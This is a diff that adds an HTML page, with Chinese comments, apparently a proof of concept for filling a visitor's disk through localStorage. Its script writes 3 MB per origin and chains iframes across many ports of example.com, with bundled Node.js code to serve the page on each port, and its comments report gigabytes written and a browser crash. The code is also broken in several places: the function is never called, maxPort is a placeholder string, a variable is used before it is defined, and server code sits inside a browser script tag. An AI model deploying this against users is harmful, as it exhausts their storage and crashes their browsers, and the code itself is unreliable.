@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+
+<body>
+  <script>
+    (function () {
+      var maxPort = '...;'
+
+      // 写文件
+      var s = "";
+      for (var i = 0; i < 3 * 1024 * 1024; i++) {
+        s += "0";
+      }
+      localStorage.setItem('k', s);
+
+      var port = parseInt(location.port) + 1;
+      if (port > maxPort) return;
+
+      if (port % 50 == 0) {
+        //每50个重定向一次，防止崩溃
+        window.location.href = url;
+      } else {
+        // 新添加iframe
+        var url = "http://example.com:" + port;
+        var $iframe = document.createElement("iframe");
+        $iframe.src = url;
+        document.getElementsByTagName("body")[0].appendChild($iframe);
+      }
+    })
+
+
+      //之后我们用Node.js架设服务器：
+
+      var http = require('http');
+      var fs = require('fs');
+
+      var content = fs.readFileSync('./index.html');
+
+      var maxPort = '...;'
+
+      for (var port = 1000; port < maxPort; port++) {
+        http.createServer(function (request, response) {
+          response.writeHead(200, { 'Content-Type': 'text/html; charset=UTF-8' });
+          response.write(content);
+          response.end();
+        }).listen(port);
+      }
+
+
+//       测试结果
+//       100个端口有几乎500MB
+
+//       200个端口则有1.17个G
+
+// 如果将端口调整至2000个 直接崩溃
+
+  </script>
+</body>
+
+</html>
